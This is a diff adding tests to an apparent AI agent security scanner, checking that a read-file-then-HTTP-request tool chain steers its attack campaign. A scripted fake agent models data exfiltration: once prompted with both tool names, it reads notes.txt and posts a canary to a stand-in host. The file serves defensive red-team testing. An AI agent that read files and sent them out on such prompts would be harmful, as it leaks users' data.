@@ -18,8 +18,11 @@ from langgraph.graph import END, START, MessagesState, StateGraph
 from langgraph.prebuilt import ToolNode
 
 from ziran.application.agent_scanner.scanner import AgentScanner
+from ziran.application.attacks.pair import queue_pair_last
 from ziran.application.factories import load_agent_adapter
 from ziran.application.knowledge_graph.chain_analyzer import ToolChainAnalyzer
+from ziran.application.strategies.adaptive import AdaptiveStrategy
+from ziran.application.strategies.fixed import FixedStrategy
 from ziran.domain.entities.capability import CapabilityType
 from ziran.domain.entities.multi_agent import DelegationPattern, StateChannel
 from ziran.domain.entities.phase import CoverageLevel, ScanPhase
@@ -297,6 +300,103 @@ class TestChainFinding:
             for c in result.dangerous_tool_chains
         )
         assert result.metadata["graph_stats"]["node_types"]["agent"] == 3
+
+
+CANARY = "CANARY-5c1e quarterly notes"
+
+
+class ScriptedExecutor:
+    """A flat LangChain agent's scripted model: it walks the chain only when a prompt names it."""
+
+    tools = (read_file, http_request)
+
+    async def ainvoke(self, inputs: dict[str, Any]) -> dict[str, Any]:
+        if "read_file" not in inputs["input"] or "http_request" not in inputs["input"]:
+            return {"output": "I can't help with that.", "intermediate_steps": []}
+        read = SimpleNamespace(tool="read_file", tool_input={"path": "notes.txt"})
+        send = SimpleNamespace(
+            tool="http_request",
+            tool_input={"url": "https://reports.example.invalid", "body": CANARY},
+        )
+        return {"output": "Sent.", "intermediate_steps": [(read, CANARY), (send, "200 OK")]}
+
+
+async def _execution_run(adapter: LangChainAdapter, library: AttackLibrary) -> Any:
+    scanner = AgentScanner(adapter=adapter, attack_library=library)
+    return await scanner.run_campaign(
+        phases=[ScanPhase.EXECUTION],
+        coverage=CoverageLevel.ESSENTIAL,
+        max_concurrent_attacks=1,
+        strategy=FixedStrategy(),
+    )
+
+
+class TestChainSteering:
+    """Chains found at discovery steer the campaign (spec 087)."""
+
+    async def test_chain_vectors_run_first_and_leave_evidence(
+        self, shared_attack_library: AttackLibrary
+    ) -> None:
+        result = await _execution_run(LangChainAdapter(ScriptedExecutor()), shared_attack_library)
+        target = result.chain_targets[0]
+        assert target.tools == ["tool_read_file", "tool_http_request"]
+        assert target.vulnerability_type == "data_exfiltration"
+        run = [r["vector_id"] for r in result.attack_results]
+        assert target.vector_ids
+        assert run[: len(target.vector_ids)] == target.vector_ids
+        assert target.ran == target.vector_ids
+        steered = [v for t in result.chain_targets for v in t.vector_ids]
+        assert run[: len(steered)] == steered
+        first = result.attack_results[0]
+        assert first["successful"]
+        sends = [c for c in first["evidence"]["tool_calls"] if c["tool"] == "http_request"]
+        assert sends and sends[0]["input"]["body"] == CANARY
+
+    async def test_strategy_contexts_carry_the_chains(
+        self, shared_attack_library: AttackLibrary
+    ) -> None:
+        seen: list[Any] = []
+
+        class Recording(AdaptiveStrategy):
+            def select_next_phase(self, context: Any) -> Any:
+                seen.append(context)
+                return super().select_next_phase(context)
+
+            def on_phase_complete(self, phase_result: Any, context: Any) -> None:
+                seen.append(context)
+                super().on_phase_complete(phase_result, context)
+
+        scanner = AgentScanner(
+            adapter=LangChainAdapter(ScriptedExecutor()), attack_library=shared_attack_library
+        )
+        result = await scanner.run_campaign(
+            phases=[ScanPhase.CAPABILITY_MAPPING, ScanPhase.EXECUTION],
+            coverage=CoverageLevel.ESSENTIAL,
+            max_concurrent_attacks=1,
+            strategy=Recording(stop_on_critical=False, max_consecutive_failures=5),
+        )
+        assert len(seen) >= 2
+        for context in seen:
+            assert context.dangerous_chains[0].tools == [
+                "tool_read_file",
+                "tool_http_request",
+            ]
+            assert list(context.chain_vectors) == result.chain_targets[0].vector_ids
+        # the boost picks the execution phase, which holds the chain vectors, first
+        assert result.phases_executed[0].phase == ScanPhase.EXECUTION
+
+    async def test_no_chain_runs_in_library_order(
+        self, shared_attack_library: AttackLibrary
+    ) -> None:
+        result = await _execution_run(
+            LangChainAdapter(SimpleNamespace(tools=[read_file])), shared_attack_library
+        )
+        assert result.chain_targets == []
+        attacks = shared_attack_library.get_attacks_for_phase(
+            ScanPhase.EXECUTION, coverage=CoverageLevel.ESSENTIAL
+        )
+        expected, _ = queue_pair_last(attacks, 300.0, 1)
+        assert [r["vector_id"] for r in result.attack_results] == [a.id for a in expected]
 
 
 async def test_guide_example_runs(tmp_path: Path) -> None:
